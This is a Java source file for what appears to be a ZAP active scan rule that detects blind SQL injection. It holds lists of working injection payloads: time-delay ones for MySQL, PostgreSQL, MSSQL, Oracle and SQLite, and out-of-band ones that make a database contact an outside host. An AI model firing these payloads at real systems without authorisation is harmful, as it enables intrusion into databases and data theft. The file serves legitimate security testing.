/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2025 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrules;

import java.io.IOException;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;
import org.apache.commons.configuration.ConversionException;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.control.Control;
import org.parosproxy.paros.core.scanner.AbstractAppParamPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.zaproxy.addon.commonlib.CommonAlertTag;
import org.zaproxy.addon.commonlib.PolicyTag;
import org.zaproxy.addon.commonlib.timing.TimingUtils;
import org.zaproxy.addon.oast.ExtensionOast;
import org.zaproxy.zap.extension.ruleconfig.RuleConfigParam;
import org.zaproxy.zap.model.Tech;
import org.zaproxy.zap.model.TechSet;

/**
 * Enhanced Blind SQL Injection Scanner
 *
 * <p>Focuses on time-based and out-of-band (OAST) detection methods specifically designed for blind
 * SQL injection vulnerabilities where traditional boolean logic payloads are ineffective.
 *
 * <p>This scanner addresses scenarios like: - Applications that return consistent responses
 * regardless of SQL query results - Modern applications with WAF protection that filter boolean
 * logic - Blind injection points that don't reflect data differences in responses
 */
public class BlindSqlInjectionScanRule extends AbstractAppParamPlugin
        implements CommonActiveScanRuleInfo {

    private static final String MESSAGE_PREFIX = "ascanrules.blindsqlinjection.";
    private static final Logger LOGGER = LogManager.getLogger(BlindSqlInjectionScanRule.class);

    private static final String ORIG_VALUE_TOKEN = "<<<<ORIGINALVALUE>>>>";
    private static final String SLEEP_TOKEN = "<<<<SLEEP>>>>";
    private static final String OAST_TOKEN = "<<<<OAST>>>>";

    private static final int DEFAULT_SLEEP_TIME = 5;
    private static final int BLIND_REQUESTS_LIMIT = 4;
    private static final double TIME_CORRELATION_ERROR_RANGE = 0.15;
    private static final double TIME_SLOPE_ERROR_RANGE = 0.30;

    private static final Map<String, String> ALERT_TAGS;

    static {
        Map<String, String> alertTags =
                new HashMap<>(
                        CommonAlertTag.toMap(
                                CommonAlertTag.OWASP_2021_A03_INJECTION,
                                CommonAlertTag.OWASP_2017_A01_INJECTION,
                                CommonAlertTag.WSTG_V42_INPV_05_SQLI,
                                CommonAlertTag.HIPAA,
                                CommonAlertTag.PCI_DSS));
        alertTags.put(PolicyTag.DEV_FULL.getTag(), "");
        alertTags.put(PolicyTag.QA_STD.getTag(), "");
        alertTags.put(PolicyTag.QA_FULL.getTag(), "");
        alertTags.put(PolicyTag.SEQUENCE.getTag(), "");
        alertTags.put(PolicyTag.PENTEST.getTag(), "");
        ALERT_TAGS = Collections.unmodifiableMap(alertTags);
    }

    private static final List<TimeBasedPayload> TIME_BASED_PAYLOADS = createTimeBasedPayloads();
    private static final List<OastPayload> OAST_PAYLOADS = createOastPayloads();

    private int timeSleepSeconds = DEFAULT_SLEEP_TIME;
    private int blindTargetCount;
    private ExtensionOast extensionOast;

    private static class TimeBasedPayload {
        final String payload;
        final String dbms;
        final String description;

        TimeBasedPayload(String payload, String dbms, String description) {
            this.payload = payload;
            this.dbms = dbms;
            this.description = description;
        }
    }

    private static class OastPayload {
        final String payload;
        final String dbms;
        final String description;

        OastPayload(String payload, String dbms, String description) {
            this.payload = payload;
            this.dbms = dbms;
            this.description = description;
        }
    }

    private static List<TimeBasedPayload> createTimeBasedPayloads() {
        List<TimeBasedPayload> payloads = new ArrayList<>();

        // MySQL Time-based payloads
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + " AND SLEEP(" + SLEEP_TOKEN + ") --",
                        "MySQL",
                        "Basic MySQL SLEEP function"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "' AND SLEEP(" + SLEEP_TOKEN + ") --",
                        "MySQL",
                        "MySQL SLEEP with single quote"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "\" AND SLEEP(" + SLEEP_TOKEN + ") --",
                        "MySQL",
                        "MySQL SLEEP with double quote"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + " OR SLEEP(" + SLEEP_TOKEN + ") --",
                        "MySQL",
                        "MySQL OR SLEEP"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "' OR SLEEP(" + SLEEP_TOKEN + ") --",
                        "MySQL",
                        "MySQL OR SLEEP with quote"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "; SELECT SLEEP(" + SLEEP_TOKEN + ") --",
                        "MySQL",
                        "MySQL stacked query SLEEP"));

        // MySQL conditional time-based
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + " AND IF(1=1,SLEEP(" + SLEEP_TOKEN + "),0) --",
                        "MySQL",
                        "MySQL conditional SLEEP"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "' AND IF(1=1,SLEEP(" + SLEEP_TOKEN + "),0) --",
                        "MySQL",
                        "MySQL conditional SLEEP with quote"));

        // PostgreSQL Time-based payloads
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + " AND pg_sleep(" + SLEEP_TOKEN + ") --",
                        "PostgreSQL",
                        "PostgreSQL pg_sleep function"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "' AND pg_sleep(" + SLEEP_TOKEN + ") --",
                        "PostgreSQL",
                        "PostgreSQL pg_sleep with quote"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "; SELECT pg_sleep(" + SLEEP_TOKEN + ") --",
                        "PostgreSQL",
                        "PostgreSQL stacked query"));

        // Microsoft SQL Server Time-based payloads
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + " AND WAITFOR DELAY '0:0:" + SLEEP_TOKEN + "' --",
                        "MSSQL",
                        "MSSQL WAITFOR DELAY"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "' AND WAITFOR DELAY '0:0:" + SLEEP_TOKEN + "' --",
                        "MSSQL",
                        "MSSQL WAITFOR DELAY with quote"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "; WAITFOR DELAY '0:0:" + SLEEP_TOKEN + "' --",
                        "MSSQL",
                        "MSSQL stacked WAITFOR"));

        // Oracle Time-based payloads
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + " AND DBMS_LOCK.SLEEP(" + SLEEP_TOKEN + ") IS NULL --",
                        "Oracle",
                        "Oracle DBMS_LOCK.SLEEP"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + "' AND DBMS_LOCK.SLEEP(" + SLEEP_TOKEN + ") IS NULL --",
                        "Oracle",
                        "Oracle DBMS_LOCK.SLEEP with quote"));

        // SQLite Time-based (heavy query approach)
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN
                                + " AND (SELECT COUNT(*) FROM (SELECT * FROM sqlite_master,sqlite_master,sqlite_master,sqlite_master)) --",
                        "SQLite",
                        "SQLite heavy query delay"));

        // Generic conditional delays
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN
                                + " AND (SELECT CASE WHEN (1=1) THEN pg_sleep("
                                + SLEEP_TOKEN
                                + ") ELSE 0 END) --",
                        "PostgreSQL",
                        "PostgreSQL conditional delay"));
        payloads.add(
                new TimeBasedPayload(
                        ORIG_VALUE_TOKEN + " UNION SELECT SLEEP(" + SLEEP_TOKEN + ") --",
                        "MySQL",
                        "MySQL UNION SLEEP"));

        return payloads;
    }

    private static List<OastPayload> createOastPayloads() {
        List<OastPayload> payloads = new ArrayList<>();

        // MySQL OAST payloads
        payloads.add(
                new OastPayload(
                        ORIG_VALUE_TOKEN
                                + " AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\','"
                                + OAST_TOKEN
                                + "','\\\\test'))) --",
                        "MySQL",
                        "MySQL LOAD_FILE UNC path"));
        payloads.add(
                new OastPayload(
                        ORIG_VALUE_TOKEN
                                + "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\','"
                                + OAST_TOKEN
                                + "','\\\\test'))) --",
                        "MySQL",
                        "MySQL LOAD_FILE UNC with quote"));

        // PostgreSQL OAST payloads
        payloads.add(
                new OastPayload(
                        ORIG_VALUE_TOKEN
                                + " AND (SELECT * FROM dblink('host="
                                + OAST_TOKEN
                                + " user=test dbname=test', 'SELECT 1')) --",
                        "PostgreSQL",
                        "PostgreSQL dblink connection"));

        // Microsoft SQL Server OAST payloads
        payloads.add(
                new OastPayload(
                        ORIG_VALUE_TOKEN
                                + " AND (SELECT * FROM OPENROWSET('SQLOLEDB','"
                                + OAST_TOKEN
                                + "';'sa';'','SELECT 1')) --",
                        "MSSQL",
                        "MSSQL OPENROWSET connection"));
        payloads.add(
                new OastPayload(
                        ORIG_VALUE_TOKEN
                                + "; EXEC master..xp_dirtree '\\\\"
                                + OAST_TOKEN
                                + "\\test' --",
                        "MSSQL",
                        "MSSQL xp_dirtree UNC"));
        payloads.add(
                new OastPayload(
                        ORIG_VALUE_TOKEN
                                + "; EXEC master..xp_fileexist '\\\\"
                                + OAST_TOKEN
                                + "\\test' --",
                        "MSSQL",
                        "MSSQL xp_fileexist UNC"));

        // Oracle OAST payloads
        payloads.add(
                new OastPayload(
                        ORIG_VALUE_TOKEN
                                + " AND UTL_INADDR.get_host_address('"
                                + OAST_TOKEN
                                + "') IS NOT NULL --",
                        "Oracle",
                        "Oracle UTL_INADDR DNS lookup"));
        payloads.add(
                new OastPayload(
                        ORIG_VALUE_TOKEN
                                + " AND UTL_HTTP.request('http://"
                                + OAST_TOKEN
                                + "/') IS NOT NULL --",
                        "Oracle",
                        "Oracle UTL_HTTP request"));

        return payloads;
    }

    @Override
    public int getId() {
        return 40030;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public boolean targets(TechSet technologies) {
        return technologies.includes(Tech.Db)
                || technologies.includes(Tech.MySQL)
                || technologies.includes(Tech.PostgreSQL)
                || technologies.includes(Tech.MsSQL)
                || technologies.includes(Tech.Oracle)
                || technologies.includes(Tech.SQLite);
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public int getCategory() {
        return Category.INJECTION;
    }

    @Override
    public String getSolution() {
        return Constant.messages.getString(MESSAGE_PREFIX + "soln");
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    @Override
    public void init() {
        LOGGER.debug("Initialising Enhanced Blind SQL Injection Scanner");

        try {
            this.timeSleepSeconds =
                    this.getConfig()
                            .getInt(RuleConfigParam.RULE_COMMON_SLEEP_TIME, DEFAULT_SLEEP_TIME);
        } catch (ConversionException e) {
            LOGGER.debug(
                    "Invalid value for 'rules.common.sleep': {}",
                    this.getConfig().getString(RuleConfigParam.RULE_COMMON_SLEEP_TIME));
        }

        // Set payload counts based on attack strength
        switch (this.getAttackStrength()) {
            case LOW:
                blindTargetCount = 3; // Quick scan with most effective payloads
                break;
            case MEDIUM:
                blindTargetCount = 8; // Balanced approach
                break;
            case HIGH:
                blindTargetCount = 15; // Comprehensive testing
                break;
            case INSANE:
                blindTargetCount = TIME_BASED_PAYLOADS.size(); // All payloads
                break;
            default:
                blindTargetCount = 5;
        }

        // Initialize OAST extension if available
        extensionOast =
                Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class);
    }

    @Override
    public void scan(HttpMessage originalMessage, String paramName, String originalParamValue) {
        LOGGER.debug(
                "Scanning parameter [{}] with value [{}] for blind SQL injection",
                paramName,
                originalParamValue);

        // Test time-based blind SQL injection
        if (testTimeBasedBlindSqlInjection(paramName, originalParamValue)) {
            return; // Found vulnerability, stop scanning
        }

        // Test OAST-based blind SQL injection if extension is available
        if (extensionOast != null && isOastEnabled()) {
            testOastBasedBlindSqlInjection(paramName, originalParamValue);
        }
    }

    private boolean testTimeBasedBlindSqlInjection(String paramName, String originalParamValue) {
        int payloadCount = Math.min(blindTargetCount, TIME_BASED_PAYLOADS.size());

        for (int i = 0; i < payloadCount && !isStop(); i++) {
            TimeBasedPayload payload = TIME_BASED_PAYLOADS.get(i);

            if (testSingleTimeBasedPayload(paramName, originalParamValue, payload)) {
                return true; // Vulnerability found
            }
        }
        return false;
    }

    private boolean testSingleTimeBasedPayload(
            String paramName, String originalParamValue, TimeBasedPayload payload) {
        AtomicReference<HttpMessage> message = new AtomicReference<>();
        AtomicReference<String> attack = new AtomicReference<>();

        TimingUtils.RequestSender requestSender =
                x -> {
                    HttpMessage msg = getNewMsg();
                    message.compareAndSet(null, msg);

                    String finalPayload =
                            payload.payload
                                    .replace(ORIG_VALUE_TOKEN, originalParamValue)
                                    .replace(SLEEP_TOKEN, Integer.toString((int) x));

                    setParameter(msg, paramName, finalPayload);
                    LOGGER.debug("Testing time-based payload [{}] = [{}]", paramName, finalPayload);
                    attack.compareAndSet(null, finalPayload);

                    sendAndReceive(msg, false);
                    return msg.getTimeElapsedMillis() / 1000.0;
                };

        try {
            boolean injectable =
                    TimingUtils.checkTimingDependence(
                            BLIND_REQUESTS_LIMIT,
                            timeSleepSeconds,
                            requestSender,
                            TIME_CORRELATION_ERROR_RANGE,
                            TIME_SLOPE_ERROR_RANGE);

            if (injectable) {
                LOGGER.debug(
                        "[Time-Based Blind SQL Injection Found] on parameter [{}] with payload [{}]",
                        paramName,
                        attack.get());

                String extraInfo =
                        Constant.messages.getString(
                                MESSAGE_PREFIX + "alert.timebased.extrainfo",
                                attack.get(),
                                message.get().getTimeElapsedMillis(),
                                originalParamValue,
                                getBaseMsg().getTimeElapsedMillis(),
                                payload.dbms,
                                payload.description);

                newAlert()
                        .setConfidence(Alert.CONFIDENCE_MEDIUM)
                        .setName(getName() + " - Time Based")
                        .setUri(getBaseMsg().getRequestHeader().getURI().toString())
                        .setParam(paramName)
                        .setAttack(attack.get())
                        .setOtherInfo(extraInfo)
                        .setMessage(message.get())
                        .raise();
                return true;
            }
        } catch (SocketException ex) {
            LOGGER.debug(
                    "Caught {} {} when accessing: {}. Target may have replied with poorly formed redirect.",
                    ex.getClass().getName(),
                    ex.getMessage(),
                    message.get().getRequestHeader().getURI());
        } catch (IOException ex) {
            LOGGER.warn(
                    "Time-based blind SQL injection check failed for parameter [{}] due to I/O error",
                    paramName,
                    ex);
        }
        return false;
    }

    private boolean testOastBasedBlindSqlInjection(String paramName, String originalParamValue) {
        int payloadCount =
                Math.min(blindTargetCount / 2, OAST_PAYLOADS.size()); // Use fewer OAST payloads

        for (int i = 0; i < payloadCount && !isStop(); i++) {
            OastPayload payload = OAST_PAYLOADS.get(i);

            if (testSingleOastPayload(paramName, originalParamValue, payload)) {
                return true; // Vulnerability found
            }
        }
        return false;
    }

    private boolean testSingleOastPayload(
            String paramName, String originalParamValue, OastPayload payload) {
        try {
            HttpMessage msg = getNewMsg();
            Alert alert =
                    newAlert()
                            .setConfidence(Alert.CONFIDENCE_HIGH)
                            .setName(getName() + " - Out-of-Band")
                            .setUri(getBaseMsg().getRequestHeader().getURI().toString())
                            .setParam(paramName)
                            .setMessage(msg)
                            .setSource(Alert.Source.ACTIVE)
                            .build();

            String oastPayload = extensionOast.registerAlertAndGetPayload(alert);
            if (oastPayload == null) {
                LOGGER.debug("Failed to register OAST payload for rule");
                return false;
            }

            String finalPayload =
                    payload.payload
                            .replace(ORIG_VALUE_TOKEN, originalParamValue)
                            .replace(OAST_TOKEN, oastPayload);

            alert.setAttack(finalPayload);
            setParameter(msg, paramName, finalPayload);
            LOGGER.debug("Testing OAST payload [{}] = [{}]", paramName, finalPayload);

            sendAndReceive(msg, false);

            // OAST will automatically raise the alert if interaction is detected
            return false; // Continue scanning since OAST is asynchronous
        } catch (Exception ex) {
            LOGGER.warn(
                    "OAST-based blind SQL injection check failed for parameter [{}] due to error",
                    paramName,
                    ex);
        }
        return false;
    }

    private boolean isOastEnabled() {
        return extensionOast != null && extensionOast.getActiveScanOastService() != null;
    }

    @Override
    public int getRisk() {
        return Alert.RISK_HIGH;
    }

    @Override
    public int getCweId() {
        return 89; // CWE-89: SQL Injection
    }

    @Override
    public int getWascId() {
        return 19; // WASC-19: SQL Injection
    }

    @Override
    public Map<String, String> getAlertTags() {
        return ALERT_TAGS;
    }

    @Override
    public TechSet getTechSet() {
        return TechSet.getAllTech();
    }
}
